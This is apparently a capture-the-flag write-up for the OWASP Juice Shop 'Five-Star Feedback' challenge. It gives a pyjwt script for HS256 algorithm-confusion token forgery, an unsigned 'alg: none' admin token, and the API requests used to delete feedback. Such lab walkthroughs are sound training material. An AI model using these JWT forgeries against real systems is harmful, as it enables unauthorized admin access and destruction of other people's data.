# Five-Star Feedback

**Category**: Broken Access Control  
**Difficulty**: 4  

---

### 🧠 Description

Was able to delete **all five-star feedbacks** despite not being an administrator. This was possible due to weak JWT validation and access control flaws.

---

### 🛠 Solution

**It is highly possible that we can ommit steps 1-4 to unlock this challenge**

1. I analyzed the JWT token stored in browser DevTools (localStorage.token).

2. I attempted to forge a valid JWT using jwt_tool.py and Python’s pyjwt, trying two methods:
   
   - RS256 with the public key obtained from .well-known/security.txt
   
   - Changing algorithm to HS256 and using the public key as the HMAC secret:
     
     ```
          import jwt
     
     with open("public.pem") as f:
     
         key = f.read()
     
     payload = {
     
         "email": "admin@juice-sh.op",
         "role": "admin"
     
     }
     
     token = jwt.encode(
     
         payload, key, algorithm="HS256",
         headers={"alg": "HS256", "typ": "JWT"}
     
     )
     
     print(token)
     ```
     
     → These attempts returned either 401 Unauthorized or no elevated access.

3. I succeeded by crafting a JWT with "alg": "none", disabling signature verification:
   
   {
     "alg": "none",
     "typ": "JWT"
   }
   .
   {
     "email": "admin@juice-sh.op",
     "role": "admin"
   }
   .

4. I replaced the JWT in the Authorization: 
   
   ```
   Bearer <TOKEN> header using Burp Suite.
   ```

5. Verified admin privileges:
   GET /rest/user/whoami

6. Listed all feedbacks:
   GET /api/Feedbacks

7. Deleted entries with "rating": 5:
   DELETE /api/Feedbacks/<id>

Challenge successfully completed.
